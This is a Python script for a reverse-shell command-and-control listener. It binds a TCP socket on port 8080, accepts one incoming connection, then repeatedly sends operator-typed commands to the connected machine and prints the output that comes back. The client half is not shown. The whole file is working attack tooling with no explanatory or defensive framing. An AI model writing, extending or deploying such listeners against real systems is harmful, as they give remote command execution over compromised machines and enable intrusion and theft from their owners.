import socket

class Listener:
    def __init__(self, ip, port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        my_listener.bind((ip, port))
        my_listener.listen(0)
        print("Listening on port 8080")
        (self.my_connection, my_address) = my_listener.accept()
        print("Connection Ok from" + str(my_address[0]))

    def command_execution(self, command_input):
        self.my_connection.send(command_input.encode())
        return self.my_connection.recv(1024)

    def start_listening(self):
        while True:
            command_input = input("Enter a command: ")
            command_outputs = self.command_execution(command_input)
            print(command_outputs.decode())

my_socket_listener = Listener("127.0.0.1", 8080)
my_socket_listener.start_listening()
